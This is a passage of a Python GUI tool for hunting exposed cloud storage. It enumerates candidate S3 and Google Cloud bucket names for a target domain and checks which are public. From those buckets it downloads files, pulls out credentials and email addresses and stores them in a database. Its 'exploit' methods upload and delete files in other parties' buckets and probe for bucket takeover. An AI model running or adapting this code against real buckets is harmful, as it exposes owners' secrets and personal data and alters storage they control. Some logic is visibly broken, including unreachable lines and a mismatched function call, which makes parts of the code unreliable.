                self.scan_results_text.insert(tk.END, f"Checking: {bucket}\n")
                self.scan_results_text.see(tk.END)
                self.root.update_idletasks()
                
                provider = self.detect_provider(bucket)
                if provider != Provider.UNKNOWN and provider_allowed(provider):
                    self.scan_results_text.insert(tk.END, f"✅ FOUND: {bucket} ({provider.value})\n")
                    self.scan_bucket_content(bucket, provider)
        
        self.scan_results_text.insert(tk.END, f"\n✅ Quick scan completed!\n")
        self.log("Quick scan completed")
    
    def full_scan(self):
        """Perform full comprehensive scan"""
        target = self.scan_target_var.get().strip()

        # Wordlist-only mode support
        wordlist_only = []
        if self.wordlist_var.get() and os.path.exists(self.wordlist_var.get()):
            try:
                with open(self.wordlist_var.get(), 'r', encoding='utf-8', errors='ignore') as f:
                    wordlist_only = [line.strip() for line in f if line.strip()]
            except Exception as e:
                self.log(f"Wordlist read error: {e}")

        if not target and not wordlist_only:
            messagebox.showwarning("Warning", "Enter target/domain OR provide a wordlist of bucket names.")
            return

        selected_provider = self.scan_provider_var.get().strip() if hasattr(self, 'scan_provider_var') else "All"

        def provider_allowed(provider: Provider) -> bool:
            if selected_provider == "All":
                return True
            if selected_provider == "AWS S3 (Amazon)":
                return provider == Provider.AWS_S3
            if selected_provider == "Google GCS":
                return provider == Provider.GOOGLE_GCS
            return True
            messagebox.showwarning("Warning", "Enter a target!")
            return
        
        self.log(f"Starting full scan for: {target}")
        self.scan_results_text.delete(1.0, tk.END)
        self.scan_results_text.insert(tk.END, f"Full scan started for: {target}\n\n")
        
        # Generate comprehensive bucket list
        variations = []

        if target:
            base = target.replace('.', '-').replace('_', '-')
            base = re.sub(r'[^a-zA-Z0-9-]', '', base)

            # Common patterns
            patterns = [
                "", "-prod", "-production", "-dev", "-development", "-staging", "-test",
                "-qa", "-uat", "-demo", "-backup", "-backups", "-logs", "-log",
                "-cdn", "-assets", "-media", "-static", "-files", "-data",
                "-images", "-videos", "-docs", "-downloads", "-uploads",
                "-archive", "-old", "-new", "-v1", "-v2", "-api", "-app"
            ]

            prefixes = ["", "cdn-", "static-", "assets-", "media-", "files-", "data-", "images-"]

            for prefix in prefixes:
                for pattern in patterns:
                    name = f"{prefix}{base}{pattern}"
                    variations.append(name)
                    variations.append(name.replace('-', '_'))

            # Add known buckets
            if target in self.known_buckets:
                variations.extend(self.known_buckets[target])

        # Load wordlist buckets (works with or without target)
        variations.extend(wordlist_only)

        variations = list(set(variations))[:8000]
        
        self.scan_results_text.insert(tk.END, f"Generated {len(variations)} bucket names to check\n\n")
        
        # Scan in parallel (provider + public accessibility check inside workers)
        found_buckets = []
        completed = 0

        self.scan_progress['maximum'] = len(variations)
        self.scan_progress['value'] = 0

        def scan_bucket_task(bucket):
            nonlocal completed
            provider = self.detect_provider(bucket)
            is_public = False

            if provider != Provider.UNKNOWN and provider_allowed(provider):
                is_public = self.check_public_bucket_access(bucket, provider)

            with self.scan_lock:
                completed += 1
                local_completed = completed

            self.root.after(0, lambda c=local_completed: self.scan_progress.configure(value=c))

            if provider != Provider.UNKNOWN and provider_allowed(provider):
                if is_public:
                    self.root.after(0, lambda b=bucket, p=provider: self.scan_results_text.insert(
                        tk.END, f"✅ FOUND PUBLIC: {b} ({p.value})\n"))
                    return (bucket, provider)
                else:
                    self.root.after(0, lambda b=bucket, p=provider: self.scan_results_text.insert(
                        tk.END, f"⛔ SKIP PRIVATE/INACCESSIBLE: {b} ({p.value})\n"))
            return None

        with ThreadPoolExecutor(max_workers=self.settings['max_threads']) as executor:
            futures = [executor.submit(scan_bucket_task, bucket) for bucket in variations]
            for future in as_completed(futures):
                result = future.result()
                if result:
                    found_buckets.append(result)
        
        self.scan_results_text.insert(tk.END, f"\n📊 Scan Results:\n")
        self.scan_results_text.insert(tk.END, f"Total buckets checked: {len(variations)}\n")
        self.scan_results_text.insert(tk.END, f"Buckets found: {len(found_buckets)}\n\n")
        
        # Scan content of found buckets
        for bucket_name, provider in found_buckets:
            self.scan_bucket_content(bucket_name, provider)
        
        self.scan_progress['value'] = 0
        self.scan_results_text.insert(tk.END, f"\n✅ Full scan completed! Found {len(found_buckets)} buckets.\n")
        self.log(f"Full scan completed. Found {len(found_buckets)} buckets")
        
        messagebox.showinfo("Scan Complete", f"Found {len(found_buckets)} buckets!")
    
    def start_scan(self):
        """Start scan from Scan tab controls"""
        if self.scanning_active:
            return

        target = self.scan_target_var.get().strip() if hasattr(self, 'scan_target_var') else ""
        wordlist_path = self.wordlist_var.get().strip() if hasattr(self, 'wordlist_var') else ""
        has_wordlist = bool(wordlist_path and os.path.exists(wordlist_path))

        if not target and not has_wordlist:
            messagebox.showwarning("Warning", "Enter a target OR provide a valid wordlist file.")
            return

        self.scanning_active = True
        if hasattr(self, 'scan_start_btn'):
            self.scan_start_btn.config(state=tk.DISABLED)
        if hasattr(self, 'scan_stop_btn'):
            self.scan_stop_btn.config(state=tk.NORMAL)
        if hasattr(self, 'scan_pause_btn'):
            self.scan_pause_btn.config(state=tk.NORMAL)
        if hasattr(self, 'scan_status_var'):
            self.scan_status_var.set("Scanning...")

        def run_scan():
            try:
                self.full_scan()
            finally:
                def finalize():
                    self.scanning_active = False
                    if hasattr(self, 'scan_start_btn'):
                        self.scan_start_btn.config(state=tk.NORMAL)
                    if hasattr(self, 'scan_stop_btn'):
                        self.scan_stop_btn.config(state=tk.DISABLED)
                    if hasattr(self, 'scan_pause_btn'):
                        self.scan_pause_btn.config(state=tk.DISABLED)
                    if hasattr(self, 'scan_status_var'):
                        self.scan_status_var.set("Ready")
                    if hasattr(self, 'scan_progress'):
                        self.scan_progress['value'] = 0
                self.root.after(0, finalize)

        threading.Thread(target=run_scan, daemon=True).start()

    def stop_scan(self):
        """Stop current scan"""
        self.scanning_active = False
        if hasattr(self, 'scan_status_var'):
            self.scan_status_var.set("Stopped")
        if hasattr(self, 'scan_start_btn'):
            self.scan_start_btn.config(state=tk.NORMAL)
        if hasattr(self, 'scan_stop_btn'):
            self.scan_stop_btn.config(state=tk.DISABLED)
        if hasattr(self, 'scan_pause_btn'):
            self.scan_pause_btn.config(state=tk.DISABLED)

    def pause_scan(self):
        """Pause scan (toggle placeholder)"""
        if hasattr(self, 'scan_status_var'):
            self.scan_status_var.set("Paused")
        if hasattr(self, 'scan_pause_btn'):
            self.scan_pause_btn.config(state=tk.DISABLED)

    def deep_scan(self):
        """Perform deep scan with thorough analysis"""
        self.log("Starting deep scan...")
        self.scan_results_text.delete(1.0, tk.END)
        self.scan_results_text.insert(tk.END, "🔬 Deep Scan Started\n")
        self.scan_results_text.insert(tk.END, "=" * 50 + "\n\n")
        
        # First, find all buckets
        self.full_scan()
        
        # Then deep scan each found bucket
        for bucket in self.buckets:
            self.scan_results_text.insert(tk.END, f"\n📦 Deep scanning: {bucket.name}\n")
            self.scan_results_text.insert(tk.END, "-" * 40 + "\n")
            
            # Check permissions
            self.scan_results_text.insert(tk.END, "Checking permissions...\n")
            self.check_bucket_permissions(bucket)
            
            # Scan all files
            self.scan_results_text.insert(tk.END, f"Scanning {len(bucket.files)} files...\n")
            
            for file_info in bucket.files[:100]:  # Limit for performance
                if self.settings['extract_credentials']:
                    self.scan_file_for_credentials(bucket.name, file_info.path, bucket.provider)
                
                if self.settings['extract_urls']:
                    self.extract_urls_from_file(bucket.name, file_info.path, bucket.provider)
                
                if self.settings['extract_emails']:
                    self.extract_emails_from_file(bucket.name, file_info.path, bucket.provider)
                
                if self.settings['calculate_hashes']:
                    self.calculate_file_hash(bucket.name, file_info.path, bucket.provider)
            
            # Check for vulnerabilities
            self.scan_results_text.insert(tk.END, "Checking for vulnerabilities...\n")
            self.scan_bucket_vulnerabilities(bucket)
            
            self.scan_results_text.insert(tk.END, f"✅ Deep scan completed for {bucket.name}\n")
        
        self.scan_results_text.insert(tk.END, f"\n✅ Deep scan completed for all buckets!\n")
        self.log("Deep scan completed")
        messagebox.showinfo("Deep Scan Complete", "Deep scan has completed. Check the Vulnerabilities tab for results.")
    
    def scan_bucket_content(self, bucket_name: str, provider: Provider):
        """Register already-validated public bucket in results (defer file listing to load phase)."""

        bucket_info = BucketInfo(
            name=bucket_name,
            provider=provider,
            url=f"https://{bucket_name}.s3.amazonaws.com/" if provider == Provider.AWS_S3 else f"https://storage.googleapis.com/{bucket_name}/",
            files=[],
            total_files=0,
            total_size=0
        )

        # Permission flags (public-focused)
        bucket_info.is_public_read = True
        bucket_info.is_public_write = self.check_public_write(bucket_name, provider)

        # Calculate risk score
        bucket_info.risk_score = self.calculate_risk_score(bucket_info)
        bucket_info.risk_level = self.get_risk_level(bucket_info.risk_score)

        # Replace existing bucket with same name/provider to avoid duplicates
        self.buckets = [
            b for b in self.buckets
            if not (b.name == bucket_info.name and b.provider == bucket_info.provider)
        ]
        self.buckets.append(bucket_info)

        self.save_bucket_to_db(bucket_info)

        def ui_update():
            self.request_results_refresh()
            self.update_bucket_combo()
            self.update_dashboard_stats()
            self.scan_results_text.insert(
                tk.END, f"✅ PUBLIC BUCKET: {bucket_name} ({provider.value}) - metadata added, files deferred to load\n"
            )

        self.root.after(0, ui_update)
    
    def get_all_files_from_bucket(self, bucket_name: str, provider: Provider) -> List[FileInfo]:
        """Get all files from bucket with metadata"""
        files = []
        
        if provider == Provider.AWS_S3:
            # More robust AWS endpoint fallback strategy
            base_candidates = [
                f"https://s3.amazonaws.com/{bucket_name}?list-type=2&max-keys=1000",            # path-style global
                f"https://{bucket_name}.s3.amazonaws.com/?list-type=2&max-keys=1000",           # virtual-hosted global
                f"https://{bucket_name}.s3.us-east-1.amazonaws.com/?list-type=2&max-keys=1000", # regional fallback
                f"https://s3.us-east-1.amazonaws.com/{bucket_name}?list-type=2&max-keys=1000",  # path-style regional fallback
            ]

            def parse_s3_listing(xml_text: str):
                keys = re.findall(r'<Key>(.*?)</Key>', xml_text, re.DOTALL)
                sizes = re.findall(r'<Size>(\d+)</Size>', xml_text)
                last_modified = re.findall(r'<LastModified>(.*?)</LastModified>', xml_text)
                parsed = []
                for i, key in enumerate(keys):
                    parsed.append(FileInfo(
                        name=key.split('/')[-1],
                        path=key,
                        size=int(sizes[i]) if i < len(sizes) else 0,
                        last_modified=last_modified[i] if i < len(last_modified) else "",
                        content_type=mimetypes.guess_type(key)[0] or "application/octet-stream",
                        file_type=self.detect_file_type(key)
                    ))
                next_token_match = re.search(r'<NextContinuationToken>(.*?)</NextContinuationToken>', xml_text)
                next_token_val = next_token_match.group(1) if next_token_match else None
                return parsed, next_token_val

            loaded_ok = False
            for base_url in base_candidates:
                continuation_token = None
                local_files = []
                seen_tokens = set()
                try:
                    while True:
                        current_url = base_url
                        if continuation_token:
                            sep = "&" if "?" in current_url else "?"
                            current_url += f"{sep}continuation-token={urllib.parse.quote(continuation_token)}"

                        resp = self.session.get(
                            current_url,
                            timeout=self.settings['timeout'],
                            verify=self.settings.get('verify_ssl', True)
                        )

                        # 200 means list succeeded, 403/404 means no listing allowed/not found
                        if resp.status_code != 200:
                            break

                        parsed_files, next_token = parse_s3_listing(resp.text)
                        local_files.extend(parsed_files)

                        if not next_token or next_token in seen_tokens:
                            break
                        seen_tokens.add(next_token)
                        continuation_token = next_token

                    if local_files:
                        files.extend(local_files)
                    # Even if empty, reaching here without SSL exception means this base style worked
                    loaded_ok = True
                    break

                except requests.exceptions.SSLError as e:
                    # try next candidate style
                    self.log(f"AWS SSL style fallback for {bucket_name}: {str(e)}")
                    continue
                except Exception as e:
                    self.log(f"Error loading from AWS: {str(e)}")
                    break

            if not loaded_ok and not files:
                # Keep silent failure minimal; scan continues without crash
                pass
                    
        elif provider == Provider.GOOGLE_GCS:
            url = f"https://storage.googleapis.com/storage/v1/b/{bucket_name}/o"
            page_token = None
            
            while True:
                try:
                    params = {'maxResults': 1000}
                    if page_token:
                        params['pageToken'] = page_token
                    
                    resp = self.session.get(url, params=params, timeout=self.settings['timeout'])
                    if resp.status_code != 200:
                        break
                    
                    data = resp.json()
                    items = data.get('items', [])
                    
                    for item in items:
                        file_info = FileInfo(
                            name=item.get('name', '').split('/')[-1],
                            path=item.get('name', ''),
                            size=int(item.get('size', 0)),
                            last_modified=item.get('updated', ''),
                            content_type=item.get('contentType', 'application/octet-stream'),
                            file_type=self.detect_file_type(item.get('name', ''))
                        )
                        files.append(file_info)
                    
                    page_token = data.get('nextPageToken')
                    if not page_token:
                        break
                        
                except Exception as e:
                    self.log(f"Error loading from GCS: {str(e)}")
                    break
        
        return files
    
    def detect_provider(self, bucket_name: str) -> Provider:
        """Detect cloud provider for bucket with better AWS/GCS compatibility."""
        timeout = self.settings.get('timeout', 15)
        verify_ssl = self.settings.get('verify_ssl', True)

        # --- GCS checks ---
        gcs_urls = [
            (f"https://storage.googleapis.com/{bucket_name}/", "GET"),
            (f"https://storage.googleapis.com/storage/v1/b/{bucket_name}", "GET"),
        ]
        for url, method in gcs_urls:
            try:
                resp = self.session.request(method, url, timeout=timeout, verify=verify_ssl, allow_redirects=True)
                if resp.status_code in (200, 204, 301, 302, 307, 308, 403):
                    server = (resp.headers.get("Server", "") or "").lower()
                    if "google" in server or "gws" in server or "uploadserver" in server or "storage.googleapis.com" in url:
                        return Provider.GOOGLE_GCS
            except requests.exceptions.RequestException:
                pass

        # --- AWS checks ---
        # NOTE: some public/protected buckets return XML errors with 403/404 but still indicate AWS bucket namespace.
        aws_checks = [
            (f"https://s3.amazonaws.com/{bucket_name}", "GET"),
            (f"https://s3.amazonaws.com/{bucket_name}/", "GET"),
            (f"https://{bucket_name}.s3.amazonaws.com/", "GET"),
        ]
        for url, method in aws_checks:
            try:
                resp = self.session.request(method, url, timeout=timeout, verify=verify_ssl, allow_redirects=True)
                body = (resp.text or "")[:1200].lower()
                server = (resp.headers.get("Server", "") or "").lower()

                if resp.status_code in (200, 301, 302, 307, 308, 403):
                    if "amazon" in server or "x-amz" in " ".join([k.lower() for k in resp.headers.keys()]) or "s3.amazonaws.com" in url:
                        return Provider.AWS_S3

                # fallback by XML signatures from S3 error responses
                aws_markers = ("<code>nosuchbucket</code>", "<code>accessdenied</code>", "<code>allaccessdisabled</code>", "<bucketname>")
                if any(m in body for m in aws_markers):
                    return Provider.AWS_S3

            except requests.exceptions.RequestException:
                pass

        return Provider.UNKNOWN
    
    def detect_file_type(self, filename: str) -> FileType:
        """Detect file type from extension"""
        ext = os.path.splitext(filename)[1].lower()
        
        if ext in ['.txt', '.md', '.rst', '.log']:
            return FileType.TEXT
        elif ext in ['.html', '.htm', '.xhtml']:
            return FileType.HTML
        elif ext in ['.js', '.mjs', '.cjs']:
            return FileType.JAVASCRIPT
        elif ext in ['.css', '.scss', '.sass']:
            return FileType.CSS
        elif ext in ['.json', '.jsonl']:
            return FileType.JSON
        elif ext in ['.xml', '.xsd', '.xsl', '.xslt']:
            return FileType.XML
        elif ext in ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.svg', '.ico']:
            return FileType.IMAGE
        elif ext in ['.mp4', '.avi', '.mov', '.wmv', '.flv', '.mkv']:
            return FileType.VIDEO
        elif ext in ['.mp3', '.wav', '.ogg', '.flac', '.aac']:
            return FileType.AUDIO
        elif ext in ['.zip', '.tar', '.gz', '.bz2', '.7z', '.rar']:
            return FileType.ARCHIVE
        elif ext in ['.exe', '.msi', '.bat', '.cmd', '.sh', '.ps1']:
            return FileType.EXECUTABLE
        elif ext in ['.db', '.sqlite', '.sqlite3']:
            return FileType.DATABASE
        elif ext in ['.conf', '.config', '.ini', '.cfg']:
            return FileType.CONFIG
        elif ext in ['.log', '.logs']:
            return FileType.LOG
        elif ext in ['.bak', '.backup']:
            return FileType.BACKUP
        elif ext in ['.crt', '.cer', '.der', '.pem']:
            return FileType.CERTIFICATE
        elif ext in ['.key', '.pkey']:
            return FileType.KEY
        elif ext in ['.env']:
            return FileType.ENV
        else:
            return FileType.UNKNOWN
    
    def check_public_read(self, bucket_name: str, provider: Provider) -> bool:
        """Check if bucket allows public read/list access"""
        return self.check_public_bucket_access(bucket_name, provider)

    def check_public_bucket_access(self, bucket_name: str, provider: Provider) -> bool:
        """Fast, cached check for public bucket accessibility (read/list) for AWS/GCS."""
        if not hasattr(self, '_public_access_cache'):
            self._public_access_cache = {}

        cache_key = (bucket_name, provider.value)
        if cache_key in self._public_access_cache:
            return bool(self._public_access_cache[cache_key])

        timeout = min(4, int(self.settings.get('timeout', 15) or 15))
        verify_ssl = self.settings.get('verify_ssl', True)

        def _try_head_then_get(url: str) -> bool:
            try:
                h = self.session.head(url, timeout=timeout, verify=verify_ssl, allow_redirects=True)
                if h.status_code in (200, 204):
                    return True
            except:
                pass
            try:
                g = self.session.get(url, timeout=timeout, verify=verify_ssl, allow_redirects=True)
                if g.status_code in (200, 204):
                    return True
            except:
                pass
            return False

        result = False

        if provider == Provider.AWS_S3:
            primary = f"https://{bucket_name}.s3.amazonaws.com/?list-type=2&max-keys=1"
            fallback = f"https://s3.amazonaws.com/{bucket_name}?list-type=2&max-keys=1"
            result = _try_head_then_get(primary) or _try_head_then_get(fallback)

        elif provider == Provider.GOOGLE_GCS:
            primary = f"https://storage.googleapis.com/storage/v1/b/{bucket_name}/o?maxResults=1"
            fallback = f"https://storage.googleapis.com/{bucket_name}/"
            result = _try_head_then_get(primary) or _try_head_then_get(fallback)

        self._public_access_cache[cache_key] = bool(result)
        return bool(result)
    
    def check_public_write(self, bucket_name: str, provider: Provider) -> bool:
        """Test if bucket allows public write access"""
        test_file = f"security_test_{int(time.time())}.txt"
        test_content = f"Security test at {datetime.now()}"

        if provider == Provider.AWS_S3:
            url = f"https://{bucket_name}.s3.amazonaws.com/{test_file}"
        else:
            url = f"https://storage.googleapis.com/{bucket_name}/{test_file}"

        try:
            resp = self.session.put(url, data=test_content.encode('utf-8'), timeout=self.settings['timeout'])
            if resp.status_code == 200:
                # Clean up
                self.session.delete(url)
                return True
        except:
            pass

        return False

    def check_bucket_permissions(self, bucket_name: str, provider: Provider) -> Dict[str, bool]:
        """Check bucket read/write/modify permissions (AWS + GCS compatible)."""
        result = {"read": False, "write": False, "modify": False}

        base_url = f"https://{bucket_name}.s3.amazonaws.com/" if provider == Provider.AWS_S3 else f"https://storage.googleapis.com/{bucket_name}/"

        # Read check
        try:
            read_resp = self.session.head(base_url, timeout=self.settings['timeout'])
            result["read"] = read_resp.status_code == 200
        except:
            result["read"] = False

        # Write + Modify check
        test_file = f"perm_test_{int(time.time())}.txt"
        test_url = f"{base_url}{test_file}"

        try:
            put1 = self.session.put(
                test_url,
                data=b"permission-check-v1",
                headers={"Content-Type": "text/plain"},
                timeout=self.settings['timeout']
            )
            if put1.status_code == 200:
                result["write"] = True

                put2 = self.session.put(
                    test_url,
                    data=b"permission-check-v2-overwrite",
                    headers={"Content-Type": "text/plain"},
                    timeout=self.settings['timeout']
                )
                if put2.status_code == 200:
                    verify = self.session.get(test_url, timeout=self.settings['timeout'])
                    if verify.status_code == 200 and b"overwrite" in verify.content:
                        result["modify"] = True

                try:
                    self.session.delete(test_url, timeout=self.settings['timeout'])
                except:
                    pass
        except:
            pass

        return result
    
    def calculate_risk_score(self, bucket: BucketInfo) -> int:
        """Calculate risk score for bucket"""
        score = 0
        
        # Public read is a risk
        if bucket.is_public_read:
            score += 30
        
        # Public write is critical
        if bucket.is_public_write:
            score += 50
        
        # Sensitive files increase risk
        if bucket.sensitive_files_count > 0:
            score += min(20, bucket.sensitive_files_count)
        
        # Credentials found
        if bucket.credentials_found > 0:
            score += min(30, bucket.credentials_found * 5)
        
        # Website enabled (more exposure)
        if bucket.website_enabled:
            score += 10
        
        # Logging not enabled
        if not bucket.logging_enabled:
            score += 5
        
        # No encryption
        if not bucket.encryption_enabled:
            score += 5
        
        return min(100, score)
    
    def get_risk_level(self, score: int) -> str:
        """Get risk level from score"""
        if score >= 70:
            return "Critical"
        elif score >= 50:
            return "High"
        elif score >= 25:
            return "Medium"
        else:
            return "Low"
    
    def scan_file_for_credentials(self, bucket_name: str, file_path: str, provider: Provider):
        """Scan a single file for credentials"""
        if provider == Provider.AWS_S3:
            url = f"https://{bucket_name}.s3.amazonaws.com/{file_path}"
        else:
            url = f"https://storage.googleapis.com/{bucket_name}/{file_path}"
        
        try:
            resp = self.session.get(url, timeout=self.settings['timeout'])
            if resp.status_code == 200:
                content = resp.content.decode('utf-8', errors='ignore')
                
                for pattern, cred_type, severity in self.sensitive_patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    for match in matches:
                        self.save_credential(bucket_name, file_path, f"{cred_type}: {match[:100]}", severity)
                        self.log(f"Found {cred_type} in {bucket_name}/{file_path}")
        except Exception as e:
            pass
    
    def save_credential(self, bucket_name: str, file_path: str, credential: str, severity: str = "medium"):
        """Save found credential to database and display (thread-safe + de-dup)."""
        # Parse credential type and value
        parts = credential.split(':', 1)
        cred_type = parts[0] if len(parts) > 0 else "Unknown"
        cred_value = parts[1].strip() if len(parts) > 1 else credential

        # Normalize severity
        sev = (severity or "medium").lower()
        if sev not in ("critical", "high", "medium", "low"):
            sev = "medium"

        found_at_iso = datetime.now().isoformat()
        found_at_ui = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # De-dup key to avoid flooding from repeated scans
        dedup_key = (bucket_name, file_path, cred_type, cred_value[:200], sev)
        if not hasattr(self, "_credential_seen"):
            self._credential_seen = set()
        if dedup_key in self._credential_seen:
            return
        self._credential_seen.add(dedup_key)

        def ui_insert():
            # Insert into tree (UI thread only)
            if hasattr(self, 'cred_tree'):
                self.cred_tree.insert('', 0, values=(
                    bucket_name,
                    file_path[:50],
                    cred_type,
                    cred_value[:100],
                    sev.upper(),
                    found_at_ui
                ), tags=(sev,))
            self.update_dashboard_stats()

        # Always marshal UI operations to main thread
        try:
            self.root.after(0, ui_insert)
        except Exception:
            pass

        # Insert into database
        with self.db_lock:
            self.cursor.execute('''
                INSERT INTO credentials (bucket_name, file_path, credential_type, credential_value, severity, found_timestamp)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (bucket_name, file_path, cred_type, cred_value[:200], sev, found_at_iso))
            self.conn.commit()
    
    def extract_urls_from_file(self, bucket_name: str, file_path: str, provider: Provider):
        """Extract URLs from file content"""
        if provider == Provider.AWS_S3:
            url = f"https://{bucket_name}.s3.amazonaws.com/{file_path}"
        else:
            url = f"https://storage.googleapis.com/{bucket_name}/{file_path}"
        
        try:
            resp = self.session.get(url, timeout=self.settings['timeout'])
            if resp.status_code == 200:
                content = resp.content.decode('utf-8', errors='ignore')
                urls = re.findall(r'https?://[^\s<>"\'\)\]]+', content)
                
                if urls:
                    self.log(f"Found {len(urls)} URLs in {file_path}")
        except:
            pass
    
    def extract_emails_from_file(self, bucket_name: str, file_path: str, provider: Provider):
        """Extract email addresses from file content"""
        if provider == Provider.AWS_S3:
            url = f"https://{bucket_name}.s3.amazonaws.com/{file_path}"
        else:
            url = f"https://storage.googleapis.com/{bucket_name}/{file_path}"
        
        try:
            resp = self.session.get(url, timeout=self.settings['timeout'])
            if resp.status_code == 200:
                content = resp.content.decode('utf-8', errors='ignore')
                emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', content)
                
                if emails:
                    for email in set(emails):
                        self.save_credential(bucket_name, file_path, f"Email: {email}", "low")
        except:
            pass
    
    def calculate_file_hash(self, bucket_name: str, file_path: str, provider: Provider):
        """Calculate MD5 hash of file"""
        if provider == Provider.AWS_S3:
            url = f"https://{bucket_name}.s3.amazonaws.com/{file_path}"
        else:
            url = f"https://storage.googleapis.com/{bucket_name}/{file_path}"
        
        try:
            resp = self.session.get(url, timeout=self.settings['timeout'])
            if resp.status_code == 200:
                content = resp.content
                md5_hash = hashlib.md5(content).hexdigest()
                
                # Update file info in bucket
                for bucket in self.buckets:
                    if bucket.name == bucket_name:
                        for file_info in bucket.files:
                            if file_info.path == file_path:
                                file_info.hash_md5 = md5_hash
                                break
                        break
        except:
            pass
    
    # ========================================================================
    # EXPLOIT METHODS
    # ========================================================================
    
    def test_write_exploit(self):
        """Test write access exploit"""
        bucket = self.get_selected_bucket_from_tree()
        if not bucket:
            return
        
        self.log(f"Testing write access on {bucket.name}")
        self.exploit_results_text.insert(tk.END, f"\n🔐 Testing write access on {bucket.name}\n")
        self.exploit_results_text.insert(tk.END, "-" * 40 + "\n")
        
        test_file = f"security_test_{int(time.time())}.txt"
        test_content = f"Security test at {datetime.now()}\nThis file was created by Cloud Storage Hunter during authorized testing."
        
        if bucket.provider == Provider.AWS_S3:
            url = f"https://{bucket.name}.s3.amazonaws.com/{test_file}"
        else:
            url = f"https://storage.googleapis.com/{bucket.name}/{test_file}"
        
        try:
            resp = self.session.put(url, data=test_content.encode('utf-8'), 
                                   headers={'Content-Type': 'text/plain'})
            
            if resp.status_code == 200:
                self.exploit_results_text.insert(tk.END, f"✅ WRITE ACCESS CONFIRMED!\n")
                self.exploit_results_text.insert(tk.END, f"   File uploaded: {url}\n")
                
                # Clean up
                self.session.delete(url)
                self.exploit_results_text.insert(tk.END, f"   Test file cleaned up.\n")
                
                # Save result
                exploit = ExploitResult(
                    bucket_name=bucket.name,
                    exploit_type="Write Access",
                    success=True,
                    details=f"Successfully uploaded test file to bucket"
                )
                self.exploit_results.append(exploit)
            else:
                self.exploit_results_text.insert(tk.END, f"❌ Write access DENIED (Status: {resp.status_code})\n")
        except Exception as e:
            self.exploit_results_text.insert(tk.END, f"❌ Error: {str(e)}\n")
    
    def test_delete_exploit(self):
        """Test delete access exploit"""
        bucket = self.get_selected_bucket_from_tree()
        if not bucket:
            return
        
        self.log(f"Testing delete access on {bucket.name}")
        self.exploit_results_text.insert(tk.END, f"\n🗑️ Testing delete access on {bucket.name}\n")
        self.exploit_results_text.insert(tk.END, "-" * 40 + "\n")
        
        # First create a test file
        test_file = f"security_test_{int(time.time())}.txt"
        test_content = "Security test file"
        
        if bucket.provider == Provider.AWS_S3:
            url = f"https://{bucket.name}.s3.amazonaws.com/{test_file}"
        else:
            url = f"https://storage.googleapis.com/{bucket.name}/{test_file}"
        
        try:
            # Create file
            put_resp = self.session.put(url, data=test_content.encode('utf-8'))
            if put_resp.status_code != 200:
                self.exploit_results_text.insert(tk.END, f"❌ Cannot create test file (no write access?)\n")
                return
            
            # Try to delete
            del_resp = self.session.delete(url)
            if del_resp.status_code in [200, 204]:
                self.exploit_results_text.insert(tk.END, f"✅ DELETE ACCESS CONFIRMED!\n")
                self.exploit_results_text.insert(tk.END, f"   File deleted: {test_file}\n")
                
                exploit = ExploitResult(
                    bucket_name=bucket.name,
                    exploit_type="Delete Access",
                    success=True,
                    details=f"Successfully deleted test file from bucket"
                )
                self.exploit_results.append(exploit)
            else:
                self.exploit_results_text.insert(tk.END, f"❌ Delete access DENIED (Status: {del_resp.status_code})\n")
        except Exception as e:
            self.exploit_results_text.insert(tk.END, f"❌ Error: {str(e)}\n")
    
    def test_website_hosting(self):
        """Test if bucket has website hosting enabled"""
        bucket = self.get_selected_bucket_from_tree()
        if not bucket:
            return
        
        self.log(f"Testing website hosting on {bucket.name}")
        self.exploit_results_text.insert(tk.END, f"\n🌐 Testing website hosting on {bucket.name}\n")
        self.exploit_results_text.insert(tk.END, "-" * 40 + "\n")
        
        endpoints = []
        
        if bucket.provider == Provider.AWS_S3:
            endpoints = [
                f"http://{bucket.name}.s3-website-us-east-1.amazonaws.com/",
                f"http://{bucket.name}.s3-website-us-west-1.amazonaws.com/",
                f"http://{bucket.name}.s3-website-eu-west-1.amazonaws.com/",
                f"http://{bucket.name}.s3-website-ap-southeast-1.amazonaws.com/",
            ]
        else:
            endpoints = [f"https://storage.googleapis.com/{bucket.name}/"]
        
        for endpoint in endpoints:
            try:
                resp = self.session.get(endpoint, timeout=self.settings['timeout'])
                if resp.status_code == 200:
                    self.exploit_results_text.insert(tk.END, f"✅ WEBSITE HOSTING ACTIVE!\n")
                    self.exploit_results_text.insert(tk.END, f"   Endpoint: {endpoint}\n")
                    self.exploit_results_text.insert(tk.END, f"   Status: {resp.status_code}\n")
                    
                    bucket.website_enabled = True
                    bucket.website_endpoint = endpoint
                    
                    exploit = ExploitResult(
                        bucket_name=bucket.name,
                        exploit_type="Website Hosting",
                        success=True,
                        details=f"Bucket hosts website at {endpoint}",
                        proof_url=endpoint
                    )
                    self.exploit_results.append(exploit)
                    return
                elif resp.status_code == 403:
                    self.exploit_results_text.insert(tk.END, f"⚠️ Website exists but is private: {endpoint}\n")
            except Exception as e:
                pass
        
        self.exploit_results_text.insert(tk.END, f"❌ No website hosting found\n")
    
    def test_bucket_takeover(self):
        """Test if bucket is vulnerable to takeover"""
        bucket = self.get_selected_bucket_from_tree()
        if not bucket:
            return
        
        self.log(f"Testing bucket takeover on {bucket.name}")
        self.exploit_results_text.insert(tk.END, f"\n🎯 Testing bucket takeover on {bucket.name}\n")
        self.exploit_results_text.insert(tk.END, "-" * 40 + "\n")
        
        # Check DNS records
        domain = bucket.name
        try:
            answers = dns.resolver.resolve(domain, 'CNAME')
            for rdata in answers:
                target = str(rdata.target).rstrip('.')
                self.exploit_results_text.insert(tk.END, f"   CNAME: {domain} → {target}\n")
                
                # Check if target bucket exists
                if 's3.amazonaws.com' in target or 'storage.googleapis.com' in target:
                    bucket_name = target.split('.')[0]
                    provider = self.detect_provider(bucket_name)
                    if provider == Provider.UNKNOWN:
                        self.exploit_results_text.insert(tk.END, f"✅ BUCKET TAKEOVER VULNERABLE!\n")
                        self.exploit_results_text.insert(tk.END, f"   The bucket '{bucket_name}' does not exist and can be claimed.\n")
                        
                        exploit = ExploitResult(
                            bucket_name=bucket.name,
                            exploit_type="Bucket Takeover",
                            success=True,
                            details=f"DNS points to non-existent bucket: {bucket_name}"
                        )
                        self.exploit_results.append(exploit)
                        return
                    else:
